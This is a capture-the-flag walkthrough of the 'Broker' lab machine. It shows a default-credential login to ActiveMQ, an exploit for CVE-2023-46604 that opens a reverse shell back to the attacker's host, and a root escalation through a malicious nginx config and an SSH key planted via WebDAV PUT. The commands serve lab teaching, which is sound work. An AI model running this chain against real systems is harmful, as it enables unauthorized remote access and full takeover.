# Broker - Writeup

## Initial Enumeration

### Port Scanning
A basic port scan revealed only two open ports:
```
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-title: Error 401 Unauthorized
```

### Web Enumeration
Upon accessing the web server on port 80, I was presented with a basic HTTP authentication prompt:
```
WWW-Authenticate: Basic realm="ActiveMQRealm"
```

This indicated that Apache ActiveMQ was running on the server, which is a popular message broker application.

## Gaining Initial Access

### Default Credentials
I attempted to use common default credentials for ActiveMQ:
```bash
curl -v -u admin:admin http://10.129.230.87
```

This was successful, confirming that the server was using default credentials:
- **Username**: admin
- **Password**: admin

### Service Version Identification
After authenticating, I examined the web interface to determine the ActiveMQ version:
```bash
curl -s -u admin:admin http://10.129.230.87 | grep -i version
```

This revealed that ActiveMQ version 5.15.0 was running on the server.

### Vulnerability Research
Research indicated that ActiveMQ 5.15.0 is vulnerable to a critical remote code execution vulnerability, identified as CVE-2023-46604. This vulnerability allows an attacker to send specially crafted serialized data to the OpenWire protocol port, leading to remote code execution.

### Exploit Development
I used a publicly available exploit for CVE-2023-46604:
```bash
git clone https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ.git
cd CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ
```

I prepared the exploit with my attack machine's IP and a chosen port for the reverse shell:
```bash
python3 activemq-exploit.py -i 10.10.14.15 -p 4444 -t http://10.129.230.87
```

I set up a listener to catch the reverse shell:
```bash
nc -lvnp 4444
```

After executing the exploit, I received a shell as the `activemq` user, confirming successful exploitation of the vulnerability.

## Privilege Escalation

### Sudo Permission Enumeration
I checked for sudo permissions available to the activemq user:
```bash
sudo -l
```

This revealed that the activemq user could run nginx as root without a password:
```
User activemq may run the following commands on broker:
    (root) NOPASSWD: /usr/sbin/nginx
```

### Nginx Configuration Exploitation
Nginx runs with the permissions of the user specified in its configuration file. By creating a custom configuration file that specifies the root user and setting up a WebDAV server, I could gain write access to the filesystem as root.

I created a malicious nginx configuration file:
```bash
cat << EOF > /tmp/nginx_pwn.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
        worker_connections 768;
}
http {
        server {
                listen 1339;
                root /;
                autoindex on;
                dav_methods PUT;
        }
}
EOF
```

I started nginx with this configuration:
```bash
sudo nginx -c /tmp/nginx_pwn.conf
```

### SSH Key Generation and Deployment
I generated an SSH key pair:
```bash
ssh-keygen -t rsa -f /tmp/pwn_key -N ""
```

Using the WebDAV PUT method, I added my public key to the root user's authorized_keys file:
```bash
curl -X PUT localhost:1339/root/.ssh/authorized_keys -d "$(cat /tmp/pwn_key.pub)"
```

### Root Access
With the SSH key in place, I connected to the server as root:
```bash
ssh -i /tmp/pwn_key root@localhost
```


I verified my access.
```bash
id
uid=0(root) gid=0(root) groups=0(root)
```

This confirmed full root access!